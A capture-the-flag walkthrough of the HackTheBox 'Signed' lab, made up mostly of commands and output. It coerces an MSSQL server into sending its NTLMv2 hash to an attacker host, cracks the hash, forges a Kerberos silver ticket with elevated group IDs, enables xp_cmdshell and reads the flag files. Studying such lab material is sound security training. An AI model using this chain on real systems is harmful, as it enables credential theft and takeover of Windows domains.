# Signed - HackTheBox Walkthrough

**Difficulty:** Medium  
**OS:** windows

## Recon

As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH

starting the box, there is only one port open

```
Nmap scan report for 10.129.242.173
Host is up (0.24s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info:
|   10.129.242.173:1433:
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.242.173:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-20T16:14:13
|_Not valid after:  2055-10-20T16:14:13
|_ssl-date: 2025-10-20T16:25:32+00:00; +25s from scanner time.
```

edit `/etc/hosts`

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/signed]
└─$ sudo vim /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


#### HTB ####
10.129.242.173  DC01 DC01.SIGNED.HTB SIGNED.HTB
```

connecting to mssql using the credentials given with `impacket-mssqlclient`

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/signed]
└─$ impacket-mssqlclient 'signed.htb/scott:Sm230#C5NatH@10.129.242.173'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (scott  guest@master)>
```

we can attempt to steal mssql service account NTLMv2 hash by using `xp_dirtree`. catching service account hash by simply trying to list shares on our own machine

```
SQL (scott  guest@master)> xp_dirtree //10.10.15.52/something


┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/signed]
└─$ sudo responder -I tun0

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.242.173
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:a09a19c13ae3f864:A3220E6C673AB6AF2D7B7805C393755B:01010000000000000078BEACFC41DC0158B701182367E30B00000000020008005900300032004D0001001E00570049004E002D004700410055005A004F0043005900500057003400550004003400570049004E002D004700410055005A004F004300590050005700340055002E005900300032004D002E004C004F00430041004C00030014005900300032004D002E004C004F00430041004C00050014005900300032004D002E004C004F00430041004C00070008000078BEACFC41DC0106000400020000000800300030000000000000000000000000300000F10B44A8D3B2826816CF77DC6102A5950C45EA14B0FD0ADA0642EB8137CF18180A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00350032000000000000000000
```

save the hash to a text file and try to crack it using **hashcat**

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/signed]
└─$ vim hash.txt

┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/signed]
└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i5-10400F CPU @ 2.90GHz, 2898/5861 MB (1024 MB allocatable), 8MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

MSSQLSVC::SIGNED:a09a19c13ae3f864:a3220e6c673ab6af2d7b7805c393755b:01010000000000000078beacfc41dc0158b701182367e30b00000000020008005900300032004d0001001e00570049004e002d004700410055005a004f0043005900500057003400550004003400570049004e002d004700410055005a004f004300590050005700340055002e005900300032004d002e004c004f00430041004c00030014005900300032004d002e004c004f00430041004c00050014005900300032004d002e004c004f00430041004c00070008000078beacfc41dc0106000400020000000800300030000000000000000000000000300000f10b44a8d3b2826816cf77dc6102a5950c45ea14b0fd0ada0642eb8137cf18180a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00350032000000000000000000:purPLE9795!@

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MSSQLSVC::SIGNED:a09a19c13ae3f864:a3220e6c673ab6af2...000000
Time.Started.....: Mon Oct 20 20:08:52 2025 (3 secs)
Time.Estimated...: Mon Oct 20 20:08:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2216.2 kH/s (0.91ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4489216/14344385 (31.30%)
Rejected.........: 0/4489216 (0.00%)
Restore.Point....: 4485120/14344385 (31.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: purdaliza -> punong
Hardware.Mon.#1..: Util: 54%

Started: Mon Oct 20 20:08:47 2025
Stopped: Mon Oct 20 20:08:56 2025

```

acquiring the NTLM hash of a service account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating **any** user  
to create TGT we need:

-   NTLM or MD4 hash of the password
-   domain-sid
-   service principal name
-   user id (user to impersonate)
-   group id. (we can add the user we are impersonating to any group)

generating MD4 hash of the password

```
iconv -f ASCII -t UTF-16LE <(printf 'purPLE9795!@') | openssl dgst -md4
MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
```

getting domain sid

```
SQL (scott  guest@master)> select suser_sid('signed\MSSQLSVC');

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
```

sid returned is in binary form and we need to convert it sid string

```
import struct


def binary_sid_to_string(hex_string):
    # Remove possible b'' and decode hex
    if isinstance(hex_string, bytes):
        data = hex_string
    else:
        data = bytes.fromhex(hex_string)

    # Parse revision and sub-authority count
    revision, subauth_count = data[0], data[1]

    # Identifier authority (6 bytes, big-endian)
    identifier_authority = int.from_bytes(data[2:8], "big")

    # Each sub-authority is 4 bytes, little-endian
    subauths = [
        struct.unpack("<I", data[8 + i * 4 : 12 + i * 4])[0]
        for i in range(subauth_count)
    ]

    # Build SID string
    sid = f"S-{revision}-{identifier_authority}-" + "-".join(str(sa) for sa in subauths)
    return sid


binary_hex = "0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000"
print(binary_sid_to_string(binary_hex))
```

we will get domain sid ending with uid

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/signed]
└─$ python sid_convert.py
S-1-5-21-4088429403-1159899800-2753317549-1103
```

getting users and groups id's

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/signed]
└─$ nxc mssql signed.htb -u 'scott' -p 'Sm230#C5NatH' --rid-brute --local-auth
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH
MSSQL       10.129.242.173  1433   DC01             498: SIGNED\Enterprise Read-only Domain Controllers
MSSQL       10.129.242.173  1433   DC01             500: SIGNED\Administrator
MSSQL       10.129.242.173  1433   DC01             501: SIGNED\Guest
MSSQL       10.129.242.173  1433   DC01             502: SIGNED\krbtgt
MSSQL       10.129.242.173  1433   DC01             512: SIGNED\Domain Admins
MSSQL       10.129.242.173  1433   DC01             513: SIGNED\Domain Users
MSSQL       10.129.242.173  1433   DC01             514: SIGNED\Domain Guests
MSSQL       10.129.242.173  1433   DC01             515: SIGNED\Domain Computers
MSSQL       10.129.242.173  1433   DC01             516: SIGNED\Domain Controllers
MSSQL       10.129.242.173  1433   DC01             517: SIGNED\Cert Publishers
MSSQL       10.129.242.173  1433   DC01             518: SIGNED\Schema Admins
MSSQL       10.129.242.173  1433   DC01             519: SIGNED\Enterprise Admins
MSSQL       10.129.242.173  1433   DC01             520: SIGNED\Group Policy Creator Owners
MSSQL       10.129.242.173  1433   DC01             521: SIGNED\Read-only Domain Controllers
MSSQL       10.129.242.173  1433   DC01             522: SIGNED\Cloneable Domain Controllers
MSSQL       10.129.242.173  1433   DC01             525: SIGNED\Protected Users
MSSQL       10.129.242.173  1433   DC01             526: SIGNED\Key Admins
MSSQL       10.129.242.173  1433   DC01             527: SIGNED\Enterprise Key Admins
MSSQL       10.129.242.173  1433   DC01             553: SIGNED\RAS and IAS Servers
MSSQL       10.129.242.173  1433   DC01             571: SIGNED\Allowed RODC Password Replication Group
MSSQL       10.129.242.173  1433   DC01             572: SIGNED\Denied RODC Password Replication Group
MSSQL       10.129.242.173  1433   DC01             1000: SIGNED\DC01$
MSSQL       10.129.242.173  1433   DC01             1101: SIGNED\DnsAdmins
MSSQL       10.129.242.173  1433   DC01             1102: SIGNED\DnsUpdateProxy
MSSQL       10.129.242.173  1433   DC01             1103: SIGNED\mssqlsvc
MSSQL       10.129.242.173  1433   DC01             1104: SIGNED\HR
MSSQL       10.129.242.173  1433   DC01             1105: SIGNED\IT
MSSQL       10.129.242.173  1433   DC01             1106: SIGNED\Finance
MSSQL       10.129.242.173  1433   DC01             1107: SIGNED\Developers
MSSQL       10.129.242.173  1433   DC01             1108: SIGNED\Support
MSSQL       10.129.242.173  1433   DC01             1109: SIGNED\oliver.mills
MSSQL       10.129.242.173  1433   DC01             1110: SIGNED\emma.clark
MSSQL       10.129.242.173  1433   DC01             1111: SIGNED\liam.wright
MSSQL       10.129.242.173  1433   DC01             1112: SIGNED\noah.adams
MSSQL       10.129.242.173  1433   DC01             1113: SIGNED\ava.morris
MSSQL       10.129.242.173  1433   DC01             1114: SIGNED\sophia.turner
MSSQL       10.129.242.173  1433   DC01             1115: SIGNED\james.morgan
MSSQL       10.129.242.173  1433   DC01             1116: SIGNED\mia.cooper
MSSQL       10.129.242.173  1433   DC01             1117: SIGNED\elijah.brooks
MSSQL       10.129.242.173  1433   DC01             1118: SIGNED\isabella.evans
MSSQL       10.129.242.173  1433   DC01             1119: SIGNED\lucas.murphy
MSSQL       10.129.242.173  1433   DC01             1120: SIGNED\william.johnson
MSSQL       10.129.242.173  1433   DC01             1121: SIGNED\charlotte.price
MSSQL       10.129.242.173  1433   DC01             1122: SIGNED\henry.bennett
MSSQL       10.129.242.173  1433   DC01             1123: SIGNED\amelia.kelly
MSSQL       10.129.242.173  1433   DC01             1124: SIGNED\jackson.gray
MSSQL       10.129.242.173  1433   DC01             1125: SIGNED\harper.diaz
MSSQL       10.129.242.173  1433   DC01             1126: SIGNED\SQLServer2005SQLBrowserUser$DC01

```

we can create the ticket

```
impacket-ticketer -nthash 'ef699384c3285c54128a3ee1ddb1a0cc' -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain 'signed.htb' -spn mssqlsvc/DC01.SIGNED.HTB:1433 administrator

export KRB5CCNAME=administrator.ccache

┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/signed]
└─$ impacket-mssqlclient -k -no-pass signed.htb/administrator@dc01.signed.htb -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Encryption required, switching to TLS
[+] Using Kerberos Cache: administrator.ccache
[+] Returning cached credential for MSSQLSVC/DC01.SIGNED.HTB:1433@SIGNED.HTB
[+] Using TGS from cache
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  guest@master)>
```

we still have guest permission with administrator account but we can get more details about logins  
and we can see any user within `IT` group have sysadmin right in the database

```
SQL (SIGNED\Administrator  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0

##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0

##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0

SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0

NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0

NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0

NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0

NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0

NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0

NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0

scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0

SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0
```

later in the privilege escalation steps, we are going to abuse `OPENROWSET` MSSQL function that allow us to use our TGS to read file from the system. the problem is if you impersonate any user other than **mssqlsvc**, it will cause username mismatch (the user running the service on host / username impersonated in TGS). what we can do here is to impersonate mssqlsvc and add it administrator groups when creating the ticket. we also need to include group id 1105 that give us sysadmin privilege inside mssql

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/signed]
└─$ impacket-ticketer -nthash 'ef699384c3285c54128a3ee1ddb1a0cc' -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain 'signed.htb' -spn mssqlsvc/DC01.SIGNED.HTB:1433 -user-id 1103 -groups 1105,512,513,518,520 administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache

┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/signed]
└─$ impacket-mssqlclient -k -no-pass signed.htb/administrator@dc01.signed.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell whoami
output
---------------
signed\mssqlsvc

NULL
```

we are now able to run system commands on the windows machine  
and we can read both user.txt and root.txt

```
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:/Users/mssqlsvc/Desktop/user.txt', SINGLE_CLOB) AS Contents
BulkColumn
---------------------------------------
b'6ec964f8f262ca812cafe613336f78eb\r\n'

SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/root.txt', SINGLE_CLOB) AS Contents
BulkColumn
---------------------------------------
b'3ba9482787cd609bca2db1054358da39\r\n'

```
